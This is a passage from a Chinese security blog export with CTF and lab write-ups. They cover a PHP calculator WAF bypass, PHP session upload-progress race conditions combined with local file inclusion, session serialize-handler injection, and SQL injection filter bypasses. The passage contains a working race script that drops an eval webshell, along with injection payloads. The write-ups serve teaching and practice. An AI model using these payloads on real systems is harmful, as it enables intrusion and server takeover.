<p>2.将某些字符转换为下划线<code>_</code></p>
</blockquote>
<p>以下为一些本地测试结果:</p>
<blockquote>
<ol type="1">
<li>位于提交的参数前面的<code>[空格]</code>、<code>%20</code>或<code>+</code>会被删除,
比如提交<code>param=1&amp;  param2=2(或param=1&amp;++param2=2)</code> ,
最终在<code>$_REQUEST</code>里是<code>("param1"=&gt;"1","param2"=&gt;"2")</code></li>
<li>位于提交的参数前面的<code>.</code>会被替换成<code>_</code> ,
提交<code>param=1&amp;..param2=2</code>,
最终在<code>$_REQUEST</code>里是<code>("param1"=&gt;"1","__param2"=&gt;"2")</code></li>
<li>位于参数名中间、末尾，无论是<code>[空格]</code>、<code>+</code>、<code>%20</code>还是<code>.</code>都会被替换成<code>_</code></li>
</ol>
</blockquote>
<p>这个WAF我们可以采用在num前面加个空格方式绕过, 构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(47))) </span><br><span class="line">//本题calc.php?%20num=var_dump(scandir(chr(47)))亦可</span><br></pre></td></tr></table></figure>
<p><code>scandir()</code>可以列出根目录下的文件,
但是<code>/</code>被过滤了,
所以用<code>chr()</code>函数,采用<code>ASCII</code>码的方式绕过</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012021640.png"
alt="image-20211101202126567" />
<figcaption aria-hidden="true">image-20211101202126567</figcaption>
</figure>
<p>根目录下有个<code>f1agg</code>,
想必就是我们要找的<strong>flag</strong>了.</p>
<p>故技重施, 用<code>chr()</code>函数拼出路径,
再用<code>file_get_contents()</code>(也可以用<code>highlight_file()</code>)获取里面的内容,
payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012031550.png"
alt="image-20211101203110483" />
<figcaption aria-hidden="true">image-20211101203110483</figcaption>
</figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>关于PHP_SESSION的漏洞利用及复现</title>
    <url>/2023/04/05/%5BWeb%5D%E5%85%B3%E4%BA%8EPHP_SESSION%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="php的序列化处理器">PHP的序列化处理器</h2>
<p><code>PHP</code>的序列化处理器有三种</p>
<ul>
<li><p><code>php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line">    <span class="comment">//查看session文件内容为</span></span><br><span class="line">    <span class="comment">//abc|i:123;qwe|i:789;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>php_serialize</code></p>
<blockquote>
<p>PHP Version &gt;= 5.5.4</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line">    <span class="comment">//查看session文件内容为</span></span><br><span class="line">    <span class="comment">//a:2:&#123;s:3:&quot;abc&quot;;i:123;s:3:&quot;qwe&quot;;i:789;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>php_binary</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;abc&quot;</span>] = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;qwe&quot;</span>] = <span class="number">789</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>session</code>文件的内容如下<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051732264.png"
alt="image-20230405173209240" /></p></li>
</ul>
<p>以上三种序列化处理器的处理方式(<code>KEY</code>代表<code>$_SESSION</code>数组的键,
比如<code>abc</code>):</p>
<ul>
<li><code>php</code>
<ul>
<li><code>KEY</code>+<code>|</code>+<code>serialize($_Session["KEY"])</code>+<code>;</code></li>
</ul></li>
<li><code>php_serialize</code>
<ul>
<li><code>serialize($_Session)</code></li>
</ul></li>
<li><code>php_binary</code>
<ul>
<li><code>char(len(KEY))</code>+<code>KEY</code>+<code>serialize("KEY")</code>+<code>;</code></li>
</ul></li>
</ul>
<blockquote>
<p>serialize()函数的序列化方式</p>
<p>[TO BE CONTINUE...]</p>
</blockquote>
<h2 id="php的会话机制">PHP的会话机制</h2>
<h3 id="工作方式">工作方式</h3>
<p><code>PHP</code>采用<code>session</code>来保存与用户的会话信息,
如果服务端开启了<code>session</code>(通过<code>session_start()</code>),
当用户访问页面时, 服务端会返回名为<code>PHPSESSID</code>(默认值,
取决于<code>session.name</code>)的<code>Cookie</code>.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//session.php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051551481.png"
alt="image-20230405155158450" />
<figcaption aria-hidden="true">image-20230405155158450</figcaption>
</figure>
<p>并且会在<code>session</code>的储存目录(取决于<code>session.save_path</code>,
我这里是<code>~/tmp/</code>,
因为通过<code>docker</code>搭建的环境为了方便,
所以映射到了宿主机的<code>~/mapping/tmp/</code>)下生成名为<code>sess_ + PHPSESSID</code>的文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051554166.png"
alt="image-20230405155451142" />
<figcaption aria-hidden="true">image-20230405155451142</figcaption>
</figure>
<p>服务端开启<code>session</code>,
如果用户访问时没有携带<code>PHPSESSID</code>,
服务端会生成一个<code>PHPSESSID</code>返回给用户,
并创建一个<code>$_SESSION</code>的变量,
服务端可以将和用户的会话信息存储在<code>$_SESSION</code>变量里,
当本次请求执行完成时,
<code>$_SESSION</code>变量将被序列化处理器(取决于<code>session.serialize_handler</code>)序列化后写入到<code>session</code>的储存目录中.
当用户第二次访问时, 就会携带上<code>PHPSESSID</code>,
服务端根据<code>PHPSESSID</code>找到对应的文件,
通过反序列化处理器反序列化后将所得数据再次写回<code>$_SESSION</code>变量,
实现会话的数据保存.</p>
<p>测试:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//counter.php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>]))</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>] += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>连续访问15次, 浏览器依次显示1~15, 查看<code>session</code>文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062023525.png"
alt="image-20230406202353502" />
<figcaption aria-hidden="true">image-20230406202353502</figcaption>
</figure>
<p>如果服务端没有打开<code>session.use_strict_mode</code>(默认关闭),
可以主动控制<code>PHPSESSID</code>的值,
从而控制服务端<code>session</code>文件的名字,
后面可以通过这个特点结合文件包含实现上传恶意代码.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051655109.png"
alt="image-20230405165505081" />
<figcaption aria-hidden="true">image-20230405165505081</figcaption>
</figure>
<p><img src="https://raw.githubusercontent.com/x2658y/static/master/images/202304051654355.png" alt="image-20230405165443332" style="zoom: 80%;" /></p>
<h3 id="php_session_upload_progress">PHP_SESSION_UPLOAD_PROGRESS</h3>
<p>有时候, 服务端并没有开启<code>session</code>,
这时候想通过常规方式往服务器写恶意的<code>session</code>文件就行不通了,
但是通常情况下,
服务器端默认开启了<code>session.upload_progress.enabled</code>这个选项.
当这个选项开启时,
无论服务端页面是否开启<code>session</code>(根据PHP文档的说法,
这个功能的优先级在脚本执行之前),
服务端都会生成<code>PHPSESSID</code>并将<code>$_SESSION</code>变量写入<code>session</code>储存目录.</p>
<p>上传页面, <code>poc.html</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务端页面, <code>index.php</code>, 为空就行 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//Blank</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>随便上传个文件, 抓包添加一个<code>Cookie: PHPSESSID=123</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062019121.png"
alt="image-20230406201929068" />
<figcaption aria-hidden="true">image-20230406201929068</figcaption>
</figure>
<p>看起来貌似什么也没发生,
但是服务端实际上已经创建了一个名为<code>sess_123</code>的<code>session</code>的文件,
然后迅速删掉了.</p>
<p>写个脚本快速地上传, 产生竞争, 就可以看到服务器上的文件内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, ALL_COMPLETED, wait</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">32</span>)</span><br><span class="line">task_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=123&quot;</span>&#125;</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;something&quot;</span>&#125;</span><br><span class="line">        files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;blank.bin&quot;</span>, io.BytesIO(<span class="string">b&#x27;\xcc&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#125;</span><br><span class="line">        requests.post(url=url,</span><br><span class="line">                        headers=headers,</span><br><span class="line">                        data=data,</span><br><span class="line">                        files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">     task_list.append(pool.submit(upload))</span><br><span class="line">wait(task_list, return_when=ALL_COMPLETED)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062021631.png"
alt="image-20230406202133601" />可以发现, 可控内容的地方有很多处,
只需要利用其中一处, 再和文件包含漏洞结合起来,
就可以实现恶意代码执行.</p>
<h3
id="php_session_upload_progress结合lfi">PHP_SESSION_UPLOAD_PROGRESS结合LFI</h3>
<p>先创建一个有本地文件包含漏洞的页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//lfi.php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]))</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>改造一下脚本, 使其能够通过竞争将恶意代码执行,
前提是知道<code>session</code>的储存位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, ALL_COMPLETED, wait</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(<span class="number">32</span>)</span><br><span class="line">task_list = []</span><br><span class="line"></span><br><span class="line">payload = <span class="string">r&quot;&quot;&quot;&lt;?php eval(&quot;fwrite(fopen(&#x27;shell.php&#x27;, &#x27;wb&#x27;), &#x27;&lt;?php @eval(\$_POST[\\&#x27;cmd\\&#x27;]); ?&gt;&#x27;);&quot;); ?&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/index.php&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=123&quot;</span>&#125;</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: payload&#125;</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&quot;blank.bin&quot;</span>, io.BytesIO(<span class="string">b&#x27;\xcc&#x27;</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#125;</span><br><span class="line">        requests.post(url=url,</span><br><span class="line">                      headers=headers,</span><br><span class="line">                      data=data,</span><br><span class="line">                      files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_shell</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://vm-ubuntu.local/lfi.php&quot;</span></span><br><span class="line">        params = &#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;/tmp/sess_123&quot;</span>&#125;</span><br><span class="line">        requests.get(url=url, params=params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    task_list.append(pool.submit(upload))</span><br><span class="line">    task_list.append(pool.submit(write_shell))</span><br><span class="line">wait(task_list, return_when=ALL_COMPLETED)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>于是就可以成功写入<code>webshell</code>.</p>
<h2 id="反序列化漏洞">反序列化漏洞</h2>
<h3
id="错误组合不同的序列化处理器导致漏洞">错误组合不同的序列化处理器导致漏洞</h3>
<p><code>PHP</code>序列化和反序列化<code>$_SESSION</code>变量的方式由<code>session.serialize_handler</code>决定,
<code>php_serialize</code>在<strong>5.5.4及以上</strong>的版本才可用,
如在一个页面采用<code>php_serialize</code>进行序列化,
而另一个页面采用<code>php</code>来反序列化,
就会导致<code>session</code>注入漏洞.</p>
<p>实例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//pageA.php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php_serialize&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;name&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;age&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&quot;age&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="comment">//pageB.php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vul</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$greet</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Exploited&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;greet.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title class_">Vul</span>();</span><br><span class="line">    <span class="variable">$i</span>-&gt;greet = <span class="string">&quot;Hello!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>请求<code>pageA.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062154304.png"
alt="image-20230406215450264" />
<figcaption aria-hidden="true">image-20230406215450264</figcaption>
</figure>
<p>查看<code>session</code>文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062155433.png"
alt="image-20230406215515412" />
<figcaption aria-hidden="true">image-20230406215515412</figcaption>
</figure>
<p>可以通过控制<code>name</code>或者<code>age</code>的值来实现注入,
在前面加上<code>|</code>,
<code>php</code>序列化处理器就会认为<code>|</code>前面的是键,
后面是键对应的值序列化后的内容.</p>
<p>构造URL:
<code>http://vm-ubuntu.local/pageA.php?name=abc&amp;age=|O:3:"Vul":1:&#123;s:5:"greet";s:6:"Hahaha";&#125;;</code></p>
<p>请求之后再次查看<code>session</code>文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062156062.png"
alt="image-20230406215648038" />
<figcaption aria-hidden="true">image-20230406215648038</figcaption>
</figure>
<p>此时再去请求<code>pageB.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062158377.png"
alt="image-20230406215830337" />
<figcaption aria-hidden="true">image-20230406215830337</figcaption>
</figure>
<p>成功的调用了<code>pageB.php</code>里<code>Vul</code>类的<code>__wakeup()</code>方法,
并实现了控制对象内部变量的值.</p>
<blockquote>
<p>关于这个输出是怎么来的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exploited    //对session文件进行反序列化前调用__wakeup()</span><br><span class="line">O:3:&quot;Vul&quot;:1:&#123;s:5:&quot;greet&quot;;s:6:&quot;Hello!&quot;;&#125;    //echo serialize($i).&quot;&lt;br/&gt;&quot; 的输出</span><br><span class="line">Hello!        //执行结束, 变量$i析构的时候调用__destruct()函数</span><br><span class="line">Hahaha        //执行结束, $_SESSION变量中的对象析构的时候调用__destruct()函数</span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>参考:</p>
<ol type="1">
<li><a href="https://cloud.tencent.com/developer/article/2035863">浅谈
SESSION_UPLOAD_PROGRESS 的利用 - 腾讯云开发者社区-腾讯云
(tencent.com)</a></li>
<li><a
href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html">php序列化
- l3m0n - 博客园 (cnblogs.com)</a></li>
<li><a href="https://xz.aliyun.com/t/6640">带你走进PHP
session反序列化漏洞 - 先知社区 (aliyun.com)</a></li>
<li><a
href="https://www.php.net/manual/zh/session.upload-progress.php">PHP:
Session 上传进度 - Manual</a></li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>PHP反序列化</tag>
        <tag>PHP_SESSION</tag>
      </tags>
  </entry>
  <entry>
    <title>[极客大挑战 2019]BabySQL 1</title>
    <url>/2021/11/02/%5BWeb%5D%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL-1/</url>
    <content><![CDATA[<p>嗯, 熟悉的味道.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062316462.png"
alt="image-20211106231659231" />
<figcaption aria-hidden="true">image-20211106231659231</figcaption>
</figure>
<p>试试万能密码</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062316743.png"
alt="image-20211106231624603" />
<figcaption aria-hidden="true">image-20211106231624603</figcaption>
</figure>
<p>不行, 注意看图上的地方, 提交的参数中的<code>or</code>被删掉了,
应该是字符串替换之类的</p>
<p>经过尝试<code>or</code>, <code>and</code>, <code>from</code>,
<code>where</code>, <code>select</code>等关键字都会被删除,
但是只会删除一次, 所以可以采用双写绕过.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062322167.png"
alt="image-20211106232220046" />
<figcaption aria-hidden="true">image-20211106232220046</figcaption>
</figure>
<p>后续采用双写测出注入点, 在第2,3列, 后续接着采用双写绕过字符替换.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062323947.png"
alt="image-20211106232338835" />
<figcaption aria-hidden="true">image-20211106232338835</figcaption>
</figure>
<p>具体操作与<a
href="/2021/10/30/%5BWeb%5D极客大挑战-2019-LoveSQL-1/">[极客大挑战
2019]LoveSQL 1</a>大体相同.</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>[强网杯 2019]随便注 1</title>
    <url>/2021/10/29/%5BWeb%5D%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
    <content><![CDATA[<p>查看源代码未找到有用信息, 尝试提交数字1, 返回一个数组,
接着尝试注入<code>1' or 1;%23</code>, 成功返回三个数组,但未找到flag.</p>
<p><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291646793.png"
alt="image-20211029164617724" /><img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291647411.png"
alt="image-20211029164706347" /></p>
<p>尝试堆叠注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;%23</span></span><br></pre></td></tr></table></figure>
<p>查出表名,可以看到<code>words</code>和<code>1919810931114514</code>两个表</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291651805.png"
alt="image-20211029165116741" />
<figcaption aria-hidden="true">image-20211029165116741</figcaption>
</figure>
<p>堆叠注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;show tables;desc `1919810931114514`;desc `words`;%23</span></span><br></pre></td></tr></table></figure>
<p>查出两个表的字段.</p>
<p>观察到<code>words</code>表有两个字段<code>id</code>和<code>data</code>,
<code>1919810931114514</code>仅有一个字段<code>flag</code>,
猜测<strong>flag</strong>就在表<code>1919810931114514</code>中.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110291701074.png"
alt="image-20211029170144998" />
<figcaption aria-hidden="true">image-20211029170144998</figcaption>
</figure>
<p>尝试注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1;select * from `1919810931114514`;%23</span></span><br></pre></td></tr></table></figure>
<p>提示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);, </span><br></pre></td></tr></table></figure>
<p>得知有关键字审查</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292207097.png"
alt="image-20211029220716039" />
<figcaption aria-hidden="true">image-20211029220716039</figcaption>
</figure>
<p>采用<strong>预编译</strong>的方式绕过关键字审查, 构造注入语句:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare stmt from @sql;EXECUTE stmt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#拆开为</span></span><br><span class="line"><span class="string">1&#x27;</span>; #闭合单引号</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> CONCAT(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>); #定义变量,采用CONCAT()拼接字符串绕过审查</span><br><span class="line"><span class="keyword">prepare</span> stmt <span class="keyword">from</span> <span class="variable">@sql</span>; #预编译<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> stmt; #执行编译完的<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292236737.png"
alt="image-20211029223621684" />
<figcaption aria-hidden="true">image-20211029223621684</figcaption>
</figure>
<p>提示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; <span class="title function_ invoke__">strstr</span>(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>有第二道关键字审查, 由于strstr区分大小写, 而set和prepare大小写不敏感,
故更改注入语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set @sql = CONCAT(&#x27;</span>se<span class="string">&#x27;,&#x27;</span>lect <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);Prepare stmt from @sql;EXECUTE stmt;</span></span><br></pre></td></tr></table></figure>
<p>即可绕过审查, 拿到flag</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110292237890.png"
alt="image-20211029223717822" />
<figcaption aria-hidden="true">image-20211029223717822</figcaption>
</figure>
<blockquote>
<p>源代码</p>
</blockquote>
